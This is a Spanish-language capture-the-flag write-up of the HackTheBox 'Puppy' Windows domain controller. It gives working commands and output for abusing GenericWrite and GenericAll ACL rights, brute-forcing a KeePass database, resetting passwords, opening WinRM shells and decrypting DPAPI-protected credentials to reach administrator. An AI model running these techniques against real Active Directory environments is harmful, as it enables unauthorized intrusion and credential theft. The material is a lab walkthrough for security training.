---
title: Puppy - Medium (HTB)
permalink: /Puppy-HTB-Writeup/
tags:
  - "Windows"
  - "Medium"
  - "ACL Rights"
  - "GenericWrite"
  - "GenericAll"
  - "SMB Enumeration"
  - "KeePass"
  - "Credentials Leakage"
  - "DPAPI Abuse"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Puppy - Medium (HTB)
seo_description: Vulnera un dominio de Active Directory abusando de derechos ACL y extrayendo credenciales DPAPI para vencer Puppy.
excerpt: Vulnera un dominio de Active Directory abusando de derechos ACL y extrayendo credenciales DPAPI para vencer Puppy.
header:
  overlay_image: /assets/images/headers/puppy-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/puppy-hackthebox.jpg
---


![image-center](/assets/images/posts/puppy-hackthebox.png)
{: .align-center}

**Habilidades:** Abusing AD ACL - `GenericWrite` Rights, SMB Enumeration, KeePass Database Password Brute Forcing, Abusing AD ACL - `GenericAll` Rights, Credentials Leakage, Abusing DPAPI Secrets [Privilege Escalation]
{: .notice--primary}

# Introducción

Puppy es una máquina Windows de dificultad `Medium` en HackTheBox donde debemos vulnerar un dominio de Active Directory a través de técnicas de explotación y movimiento lateral que involucran derechos AC hasta el abuso de la API de Protección de Datos de Windows para vencer Puppy. 
<br>
En la descripción de la máquina, el creador nos deja el siguiente mensaje, el cual contiene unas credenciales de usuario

> Machine Information
>
> As is common in real life pentests, you will start the Puppy box with credentials for the following account: `levi.james` / `KingofAkron2025!`
{: .notice--info}
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.70                              
PING 10.10.11.70 (10.10.11.70) 56(84) bytes of data.
64 bytes from 10.10.11.70: icmp_seq=1 ttl=127 time=281 ms

--- 10.10.11.70 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 281.451/281.451/281.451/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos con un escaneo de puertos por el protocolo TCP. Este escaneo inicial se encargará de descubrir servicios expuestos escaneando todo el rango de puertos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.70 -oG openPorts
 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 23:55 EDT
Nmap scan report for 10.10.11.70
Host is up (0.29s latency).
Not shown: 65512 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3260/tcp  open  iscsi
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49674/tcp open  unknown
49697/tcp open  unknown
63360/tcp open  unknown
63389/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 53.70 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo a los puertos descubiertos, esta vez identificaremos la versión y el servicio que se está ejecutando en cada puerto

~~~ bash
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49669,49674,49697,63360,63389 -sVC 10.10.11.70 -oN services 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 23:58 EDT
Nmap scan report for 10.10.11.70
Host is up (0.69s latency).

Bug in iscsi-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-22 03:58:16Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49697/tcp open  msrpc         Microsoft Windows RPC
63360/tcp open  msrpc         Microsoft Windows RPC
63389/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-22T04:00:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 603.24 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos mucha información sobre servicios expuestos (como `DNS`, `kerberos`, `LDAP`, etc.), esto claramente es un indicativo de que estamos frente a un controlador de dominio.

En la última captura de `nmap` vemos tanto el nombre del dominio como del host, agregaremos esta información a nuestro archivo `/etc/hosts` para aplicar correctamente una resolución DNS

~~~ bash
echo '10.10.11.70 puppy.htb DC.puppy.htb' | sudo tee -a /etc/hosts 

10.10.11.70 puppy.htb DC.puppy.htb
~~~


## Domain Analysis - `Bloodhound` 

Utilizaremos las credenciales del usuario `levi.james` para recolectar información del dominio y poder realizar un análisis con `Bloodhound`

> Usaremos el comando `ntpdate` para sincronizar nuestro reloj con el DC, esto es requerido durante el proceso de autenticación `kerberos`
{: .notice--info}

~~~ bash
ntpdate DC.puppy.htb && bloodhound-python -d puppy.htb -ns 10.10.11.70 --zip -c All -u levi.james -p 'KingofAkron2025!'

2025-09-22 00:32:36.395723 (-0400) +0.057484 +/- 0.286886 DC.puppy.htb 10.10.11.70 s1 no-leap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 01M 10S
INFO: Compressing output into 20250922003256_bloodhound.zip
~~~

### Users

Opcionalmente, podemos generar un listado de usuarios del dominio a través de una consulta utilizando el protocolo RPC

~~~ bash
rpcclient DC.puppy.htb -U 'levi.james%KingofAkron2025!' -c enumdomusers | cut -d ' ' -f1-1 | grep -oP '\[.*?\]' | tr -d '[]' | tee users.txt 

Administrator
Guest
krbtgt
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
~~~


## (Posible) NFS Enumeration
 
Vemos que un servidor `NFS` se encuentra activo, sin embargo a la hora de realizar una enumeración inicial, no veremos nada interesante

~~~ bash
showmount 10.10.11.70 --all
All mount points on 10.10.11.70:
~~~


## (Posible) SMB Enumeration

Con las credenciales actuales, intentaremos listar recursos de red a través del procotolo SMB

~~~ bash
smbmap -H 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!'
~~~
<br>


# Intrusión / Explotación
---
## Abusing AD ACL - `GenericWrite` Rights

Podemos notar que el grupo `HR` posee derechos `GenericWrite` sobre el grupo `DEVELOPERS`, además de que `levi.james` es parte de `HR`, esto nos permite modificar cualquier atributo no protegido del objeto, como información básica. 

Por ejemplo para un grupo sin privilegios elevados, podemos modificar las membresías, permitiendo agregar al usuario que controlamos para que forme parte de este grupo

![image-center](/assets/images/posts/puppy-bloodhound.png)
{: .align-center}

Agregaremos al usuario `levi.james` al grupo `DEVELOPERS` con el comando `net`

~~~ bash
net rpc group addmem 'DEVELOPERS' 'levi.james' -U 'puppy.htb/levi.james%KingofAkron2025!' -S DC.puppy.htb
~~~

Verificaremos que ahora `levi.james` forma parte del grupo `DEVELOPERS` al listar a los miembros

~~~ bash
net rpc group members 'DEVELOPERS' -U 'puppy.htb/levi.james%KingofAkron2025!' -S DC.puppy.htb  
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
~~~


## SMB Enumeration

Si realizamos una enumeración nuevamente del servicio `SMB`, notaremos que ahora tenemos acceso con permisos de lectura al recurso compartido `DEV`

~~~ bash
smbmap -H DC.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' 
[+] IP: DC.puppy.htb:445	Name: unknown                                           
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DEV                                               	READ ONLY	DEV-SHARE for PUPPY-DEVS
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
~~~

Podemos conectaremos al recurso compartido con `smbclient`

~~~ bash
smbclient //DC.puppy.htb/DEV -U 'levi.james%KingofAkron2025!'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

		5080575 blocks of size 4096. 1626228 blocks available
smb: \> 
~~~

Vemos que existe un instalador (`.msi`), una carpeta `Projects`, y un archivo `.kdbx`. Descargaremos este último archivo para analizarlo desde nuestra máquina

~~~ bash
smb: \> get recovery.kdbx 
getting file \recovery.kdbx of size 2677 as recovery.kdbx (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
~~~

Nos han dejado una pista clara en el servidor `SMB`, el archivo en cuestión se trata de una base de datos para `KeePass`, concretamente para la versión `2` en adelante

~~~ bash
file recovery.kdbx 
recovery.kdbx: Keepass password database 2.x KDBX
~~~


## KeePass Database Password Brute Forcing

> KeePass es un administrador de contraseñas gratuito, de código abierto y liviano que permite almacenar todas tus contraseñas en una base de datos cifrada y segura.
{: .notice--info}

KeePass guarda las credenciales en un único archivo de base de datos, este contenido está cifrado con algoritmos modernos y robustos (como `AES-256`, `ChaCha20` y `Twofish` ). Únicamente necesitamos saber la contraseña de esta base de datos, también conocida como "clave maestra".

El formato KDBX 4.x (KeePass >=2.36) aún no es soportado por  herramientas como `keepass2john`, por lo que no hay forma conocida de extraer el hash y crackearlo.

~~~ bash
keepass2john recovery.kdbx

! recovery.kdbx : File version '40000' is currently not supported!
~~~

Existe una versión de `keepass2john` disponible en [`Github`](https://github.com/r3nt0n/keepass4brute) que soporta versiones posteriores a la `2.36`, la cual podrá construir un hash, aunque no en un formato que verdaderamente entiendan `john` o `hashcat`.

Alternativamente, podemos utilizar la herramienta [`keepass4brute`](https://github.com/r3nt0n/keepass4brute), esta herramienta es un parche rápido y sucio para la situación actual. 

Se aplica fuerza bruta probando una lista de palabras proporcionada directamente contra el archivo de base de datos, utilizando la herramienta de línea de comandos de `keepass`. El siguiente ejemplo muestra un intento fallido vs uno exitoso de desbloqueo

~~~ bash
# Incorrecta
keepassxc-cli open ../recovery.kdbx
Enter password to unlock ../recovery.kdbx: 
Error while reading the database: Invalid credentials were provided, please try again.
If this reoccurs, then your database file may be corrupt. (HMAC mismatch)

# Correcta
keepassxc-cli open ../recovery.kdbx
Enter password to unlock ../recovery.kdbx: 
recovery> ls
JAMIE WILLIAMSON
ADAM SILVER
ANTONY C. EDWARDS
STEVE TUCKER
SAMUEL BLAKE
~~~

Clonaremos la herramienta a nuestro directorio de trabajo y la ejecutaremos para iniciar los intentos

~~~ bash
git clone https://github.com/r3nt0n/keepass4brute
cd keepass4brute

./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt   
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 72 - Estimated time remaining: 19 weeks, 5 days
[+] Current attempt: liverpool

[*] Password found: liverpool
~~~

Hemos encontrado la contraseña `liverpool`, la cual debería desbloquear la base de datos

![image-center](/assets/images/posts/puppy-keepass.png)
{: .align-center}

Dentro de la base de datos, encontraremos credenciales para varias cuentas del dominio

![image-center](/assets/images/posts/puppy-keepass-2.png)
{: .align-center}


## Path to `adam.silver`

Si verificamos desde `Bloodhound` la cuenta de`adam.silver`, notaremos que este usuario se encuentra deshabilitado

![image-center](/assets/images/posts/puppy-bloodhound-2.png)
{: .align-center}

Al intentar utilizar sus credenciales, obtendremos un error, el mismo que confirma que la cuenta está inactiva

~~~ bash
nxc smb DC.puppy.htb -u 'adam.silver' -p 'HJKL2025!' -k 
SMB         DC.puppy.htb    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         DC.puppy.htb    445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! KDC_ERR_CLIENT_REVOKED
~~~

> El error "KDC_ERR_CLIENT_REVOKED" indica que las credenciales de la cuenta del usuario han sido revocadas por el Centro de Distribución de Claves (KDC). 
{: .notice--danger}

Esto ocurre cuando la cuenta está desactivada, bloqueada, caducada o si el usuario está intentando iniciar sesión durante un horario restringido, y significa que el usuario no puede iniciar sesión hasta que se resuelva el estado de la cuenta.

Si logramos activar la cuenta del usuario `adam.silver`, lograremos conectarnos al DC vía `winrm`, gracias a que es miembro del grupo `Remote Management Users`

![image-center](/assets/images/posts/puppy-bloodhound-3.png)
{: .align-center}

> El grupo `Remote Management Users` (Usuarios de Administración Remota) en **Active Directory (AD)** es un **grupo de seguridad local de dominio** que se utiliza para permitir a sus miembros el acceso remoto para realizar tareas de gestión y configuración mediante el protocolo **Windows Remote Management (WinRM)**.
{: .notice--info}


## Abusing AD ACL - `GenericAll` Rights

El grupo `Senior Devs` posee derechos `GenericAll` sobre la cuenta `adam.silver`, y el usuario `ant.edwars` es miembro de este grupo, esto nos otorga control total sobre un objeto, pudiendo modificar cualquier atributo.

Podemos aprovechar estos derechos para activar la cuenta de `adam.silver` con las credenciales de `ant.edwards`

> Las credenciales de `ant.edwards` las podemos obtener desde la base de datos de `KeePass` que abrimos anteriormente
{: .notice--warning}

![image-center](/assets/images/posts/puppy-bloodhound-4.png)
{: .align-center}

Activaremos la cuenta del usuario `adam.silver` utilizando herramientas como `bloodyAD`, donde quitamos el atributo `ACCOUNTDISABLE`

~~~ bash
bloodyAD --host DC.puppy.htb -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
~~~

Si intentamos validar las credenciales de `adam.silver`, notaremos que no podemos autenticarnos

~~~ bash
getTGT.py puppy.htb/adam.silver:'HJKL2025!' -dc-ip 10.10.11.70
 
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
~~~

### Changing Password

Como tenemos derechos de control total sobre `adam.silver`, cambiaremos su contraseña

~~~ bash
net rpc password "adam.silver" "newP@ssword2025" -U 'puppy.htb/ant.edwards%Antman2025!' -S dc.puppy.htb
~~~

Si ahora validamos las nuevas credenciales, lograremos autenticarnos correctamente

~~~ bash
nxc smb DC.puppy.htb -u 'adam.silver' -p 'newP@ssword2025'                                             
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\adam.silver:newP@ssword2025
~~~


## Shell as `adam.silver`

Con la cuenta habilitada y una nueva contraseña asignada, podemos conectarnos por `winrm` al DC utilizando las nuevas credenciales de `adam.silver`

~~~ bash
evil-winrm-py -i DC.puppy.htb -u 'adam.silver' -p 'newP@ssword2025'
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC.puppy.htb:5985 as adam.silver
evil-winrm-py PS C:\Users\adam.silver\Documents> whoami
puppy\adam.silver
~~~

En este punto ya podremos ver la flag del usuario sin privilegios

~~~ powershell
evil-winrm-py PS C:\Users\adam.silver\Documents> type ..\Desktop\user.txt
d07...
~~~
<br>


# Escalada de Privilegios
---
## Credentials Leakage

Navegando por el sistema de archivos, encontraremos una carpeta `Backups`, y dentro de ella veremos un archivo `.zip` que al parecer es una copia de seguridad de un sitio web

~~~ powershell
evil-winrm-py PS C:\Users\adam.silver\Documents> dir C:\

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          4/4/2025   3:40 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---         5/20/2025   3:21 AM                Users
d-----         5/13/2025   4:40 PM                Windows

evil-winrm-py PS C:\Users\adam.silver\Documents> dir C:\Backups 

    Directory: C:\Backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
~~~

Aprovecharemos la funcionalidad para descargar archivos directamente en nuestra máquina con el comando  `download`

~~~ bash
evil-winrm-py PS C:\Users\adam.silver\Documents> download C:\Backups\site-backup-2024-12-30.zip .
~~~

Procedemos a descomprimir este archivo `.zip` en nuestra máquina atacante, el comprimido contiene `3` archvios

~~~ bash
unzip site-backup-2024-12-30.zip

ls
assets images index.html nms-auth-config.xml.bak
~~~

Si vemos el contenido del archivo `nms-auth-config.xml.bak`, veremos unas credenciales

~~~ bash
cat nms-auth-config.xml.bak

<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
~~~

Podemos validar estas credenciales rápidamente con herramientas como  `netexec`

~~~ bash
nxc smb dc.puppy.htb -u 'steph.cooper' -p 'ChefSteph2025!'            
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025!
~~~


## Shell as `steph.cooper`

Nos conectaremos a la máquina a través de protocolo `winrm` con las credenciales del usuario `steph.cooper`

~~~ bash
evil-winrm-py -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!'   
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to 10.10.11.70:5985 as steph.cooper
evil-winrm-py PS C:\Users\steph.cooper\Documents> whoami
puppy\steph.cooper
~~~


## Abusing Data Protection API Secrets 

> **DPAPI** (Data Protection API) es una API de cifrado integrada en Windows que permite proteger datos sensibles (como contraseñas, claves y credenciales) de forma automática, utilizando las credenciales del usuario o del sistema.
{: .notice--info}

DPAPI protege los datos utilizando una `master key`, normalmente cifrada con las credenciales del usuario en formato hash.

El [abuso o lectura de secretos DPAPI](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets) es una técnica de post-explotación que logra obtener información sensible protegida por DPAPI. 

Para descifrar datos protegidos por esta funcionalidad de Windows necesitamos extraer los siguientes archivos:

- `Master Key`: Clave maestra, la necesitaremos para desencriptar credenciales
- `Credential File`: Archivo de credenciales protegidas por DPAPI

Los datos se almacenan en el directorio de usuarios y están protegidos por esta clave maestra. Normalmente se encuentran el la siguiente carpeta

~~~ powershell
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
~~~

Los datos protegidos suelen encontrarse dentro de los siguientes directorios del usuario

~~~ powershell
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
~~~

### Finding DPAPI Master Key

Encontraremos el archivo correspondiente a la clave maestra que necesitamos en el directorio mencionado, lo descargaremos en nuestra máquina utilizando el comando `download` de `evil-wirm-py`

~~~ powershell
evil-winrm-py PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> download 556a2412-1275-4ccf-b721-e6a0b4f90407 .
~~~

### Finding Credential File

Ahora buscaremos credenciales protegidas para descifrarlas con la clave maestra, descargaremos el siguiente archivo

~~~ powershell
evil-winrm-py PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> download C8D69EBE9A43E9DEBF6B5FBD48B521B9 .
~~~

### Decrypting DPAPI Master Key

Desencriptaremos la clave maestra contenida dentro del archivo que descargamos con la ayuda de la herramienta de `impacket-dpapi`

~~~ bash
impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password ChefSteph2025!

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
~~~

- `-file`: Archivo de clave maestra
- `-sid`: Identificador del usuario
- `-password`: Contraseña del usuario 

### Decrypting DPAPI Credentials

Utilizaremos la clave maestra para desencriptar el archivo de credenciales y verlas en texto claro 

~~~ bash
impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
~~~

- `-file`: Archivo que contiene credenciales protegidas
- `-key`: Clave maestra desencriptada anteriormente

Obtuvimos las credenciales `FivethChipOnItsWay2025!` y son válidas para el usuario `steph.cooper_adm`

~~~ bash
nxc smb DC.puppy.htb -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
~~~

Veremos un `(Pwn3d!)`, normalmente significa que el usuario tiene privilegios elevados. Si comprobamos desde `BloodHound`, veremos que es miembro del grupo `Administrators`

![image-center](/assets/images/posts/puppy-bloodhound-5.png)
{: .align-center}


## Root Time

Nos conectaremos a través de `winrm` a la máquina víctima utilizando las credenciales para el usuario `steph.cooper_adm`

~~~ bash
evil-winrm-py -i DC.puppy.htb -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC.puppy.htb:5985 as steph.cooper_adm
evil-winrm-py PS C:\Users\steph.cooper_adm\Documents> whoami
puppy\steph.cooper_adm
~~~

Ya podremos ver la flag del sistema ubicada en la carpeta de escritorio del usuario `Administrator`

~~~ powershell
evil-winrm-py PS C:\Users\steph.cooper_adm\Documents> type C:\Users\Administrator\Desktop\root.txt
179...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Every problem has a gift for you in its hands.
> — Richard Bach
{: .notice--info}
